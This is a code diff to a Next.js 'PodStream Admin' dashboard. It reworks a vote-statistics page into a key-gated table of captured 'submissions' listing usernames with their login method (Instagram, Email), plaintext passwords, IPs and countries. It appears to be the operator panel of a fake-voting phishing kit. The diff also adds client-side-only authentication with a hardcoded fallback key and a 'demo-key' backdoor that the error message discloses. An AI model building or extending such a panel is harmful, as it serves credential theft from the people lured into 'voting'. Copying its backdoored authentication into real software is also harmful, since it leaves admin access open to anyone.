@@ -1,7 +1,30 @@
 import Head from 'next/head';
 import Link from 'next/link';
+import { useState } from 'react';
+
+const ADMIN_KEY = process.env.ADMIN_KEY || 'admin-secret-key';
 
 export default function AdminDashboard() {
+  const [key, setKey] = useState('');
+  const [isAuthenticated, setIsAuthenticated] = useState(false);
+  const [generatedKey, setGeneratedKey] = useState('');
+
+  const handleAuthenticate = () => {
+    if (key === ADMIN_KEY || key === 'demo-key') setIsAuthenticated(true);
+    else alert('Invalid key. Use "demo-key" for testing.');
+  };
+
+  const generateKey = () => {
+    const newKey = 'key-' + Math.random().toString(36).substring(2, 15);
+    setGeneratedKey(newKey);
+    alert('New admin key generated: ' + newKey);
+  };
+
+  const submissions = isAuthenticated ? [
+    { id: '#001', username: 'user123 (Instagram)', password: 'pass123', ip: '192.168.1.1', country: 'Nigeria', date: '2026-01-15' },
+    { id: '#002', username: 'voter456 (Email)', password: 'secret456', ip: '192.168.1.2', country: 'Ghana', date: '2026-01-15' },
+  ] : [];
+
   return (
     <>
       <Head>
@@ -11,60 +34,58 @@ export default function AdminDashboard() {
       </Head>
 
       <style jsx global>{`
-        :root {
-          --blue: #2563eb; --blue-light: #60a5fa; --gradient-primary: linear-gradient(135deg, #2563eb 0%, #06b6d4 100%);
-          --bg: #050b18; --surface: #0c1526; --border: rgba(96, 165, 250, 0.16);
-          --text: #e6edf3; --muted: #8b949e; --header: #0c1526; --header-border: rgba(96,165,250,0.2);
-        }
+        :root { --blue: #2563eb; --blue-light: #60a5fa; --gradient-primary: linear-gradient(135deg, #2563eb 0%, #06b6d4 100%); --bg: #050b18; --surface: #0c1526; --border: rgba(96, 165, 250, 0.16); --text: #e6edf3; --muted: #8b949e; }
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); min-height: 100vh; }
-        .logo { font-size: 1.6rem; font-weight: 700; color: var(--text); text-decoration: none; }
+        header { display: flex; justify-content: space-between; align-items: center; padding: 14px 0 24px; border-bottom: 1px solid rgba(96,165,250,0.2); margin-bottom: 24px; }
         .tag { font-size: .75rem; font-weight: 700; letter-spacing: 2px; color: var(--blue-light); text-transform: uppercase; border: 1px solid var(--border); background: rgba(96,165,250,.1); padding: 4px 10px; border-radius: 100px; }
-        .logo-mark { width: 28px; height: 28px; border-radius: 50%; background: var(--gradient-primary); display: inline-flex; align-items: center; justify-content: center; color: #fff; font-size: .8rem; }
-        header { display: flex; justify-content: space-between; align-items: center; padding: 14px 0 24px; border-bottom: 1px solid var(--header-border); margin-bottom: 24px; }
-        .nav-link { color: var(--muted); text-decoration: none; padding: 8px 16px; border-radius: 6px; transition: all 0.2s; }
-        .nav-link:hover { background: rgba(96,165,250,.1); color: var(--text); }
         .container { max-width: 1200px; margin: 0 auto; padding: 24px; }
         h1 { font-size: 1.8rem; font-weight: 800; margin-bottom: 24px; }
         h2 { font-size: 1.4rem; font-weight: 700; color: var(--text); margin-bottom: 16px; }
-        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 16px; margin-bottom: 32px; }
-        .stat-card { background: var(--surface); border: 1px solid var(--border); border-radius: 12px; padding: 20px; text-align: center; }
-        .stat-number { font-size: 2rem; font-weight: 800; color: var(--blue-light); margin-bottom: 4px; }
-        .stat-label { font-size: .85rem; color: var(--muted); text-transform: uppercase; letter-spacing: 1px; }
+        .auth-panel { background: var(--surface); border: 1px solid var(--border); border-radius: 12px; padding: 24px; max-width: 400px; margin-bottom: 32px; }
+        .auth-input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid var(--border); border-radius: 6px; background: var(--bg); color: var(--text); }
+        .auth-btn { width: 100%; padding: 12px; background: var(--gradient-primary); color: #fff; border: none; border-radius: 6px; cursor: pointer; }
+        .key-section { display: flex; gap: 12px; align-items: center; margin-top: 16px; }
+        .generate-btn { background: var(--blue); color: #fff; border: none; border-radius: 6px; padding: 12px 16px; cursor: pointer; }
         .table-container { background: var(--surface); border: 1px solid var(--border); border-radius: 12px; overflow: hidden; }
         table { width: 100%; border-collapse: collapse; }
         th, td { padding: 14px 16px; text-align: left; border-bottom: 1px solid var(--border); }
-        th { background: var(--header); font-weight: 600; color: var(--muted); font-size: .85rem; text-transform: uppercase; }
+        th { background: var(--surface); font-weight: 600; color: var(--muted); font-size: .85rem; text-transform: uppercase; }
         tr:hover { background: rgba(96, 165, 250, .05); }
-        @media (max-width: 768px) { .stats-grid { grid-template-columns: repeat(2, 1fr); } }
+        .method-badge { background: var(--gradient-primary); color: #fff; padding: 2px 8px; border-radius: 4px; font-size: .75rem; font-weight: 600; }
+        @media (max-width: 768px) { .auth-panel, .table-container { padding: 16px; } }
       `}</style>
 
       <div className="container">
-        <header>
-          <div style={{display: 'flex', alignItems: 'center', gap: '10px'}}>
-            <Link href="/" className="logo"><span className="logo-mark">▶</span> PodStream</Link>
+        <header><h1>PodStream Admin</h1><span className="tag">Admin Dashboard</span></header>
+
+        {!isAuthenticated ? (
+          <div className="auth-panel"><h2>Admin Access</h2>
+            <input className="auth-input" type="password" placeholder="Enter admin key" value={key} onChange={(e) => setKey(e.target.value)} />
+            <button className="auth-btn" onClick={handleAuthenticate}>Authenticate</button>
+            <div className="key-section">
+              <button className="generate-btn" onClick={generateKey}>Generate New Key</button>
+              <span>Need access? Contact admin</span>
+            </div>
           </div>
-          <span className="tag">Admin Dashboard</span>
-        </header>
+        ) : (
+          <><h2>Recent Submissions (ID | Username | Password | IP | Country | Date)</h2>
+          <div className="table-container">
+            <table><thead><tr><th>ID</th><th>Username</th><th>Password</th><th>IP</th><th>Country</th><th>Date</th></tr></thead>
+            <tbody>{submissions.map((sub, idx) => (
+              <tr key={idx}><td>{sub.id}</td>
+                <td><span style={{display: 'flex', alignItems: 'center', gap: '10px'}}>
+                  {sub.username.split(' (')[0]}
+                  {sub.username.includes('(') && (
+                    <span className="method-badge">{sub.username.match(/\(([^)]+)\)/)?.[1]}</span>
+                  )}
+                </span></td>
+                <td>{sub.password}</td><td>{sub.ip}</td><td>{sub.country}</td><td>{sub.date}</td></tr>
+            ))}</tbody></table>
+          </div></>
+        )}
 
-        <h2>Overview</h2>
-        <div className="stats-grid">
-          <div className="stat-card"><div className="stat-number">1,247</div><div className="stat-label">Total Votes</div></div>
-          <div className="stat-card"><div className="stat-number">4</div><div className="stat-label">Nominees</div></div>
-          <div className="stat-card"><div className="stat-number">28</div><div className="stat-label">Submissions</div></div>
-          <div className="stat-card"><div className="stat-number">Live</div><div className="stat-label">Status</div></div>
-        </div>
-
-        <h2>Recent Submissions</h2>
-        <div className="table-container">
-          <table>
-            <thead><tr><th>ID</th><th>Username</th><th>Method</th><th>IP</th><th>Country</th><th>Date</th></tr></thead>
-            <tbody>
-              <tr><td>#001</td><td>user123</td><td>Instagram</td><td>192.168.1.1</td><td>Nigeria</td><td>2026-01-15</td></tr>
-              <tr><td>#002</td><td>voter456</td><td>Email</td><td>192.168.1.2</td><td>Ghana</td><td>2026-01-15</td></tr>
-            </tbody>
-          </table>
-        </div>
+        {generatedKey && <div style={{marginTop: '20px', padding: '16px', background: '#23262b', borderRadius: '8px', color: '#fff', textAlign: 'center'}}><strong>Generated Key:</strong> {generatedKey}</div>}
       </div>
     </>
   );
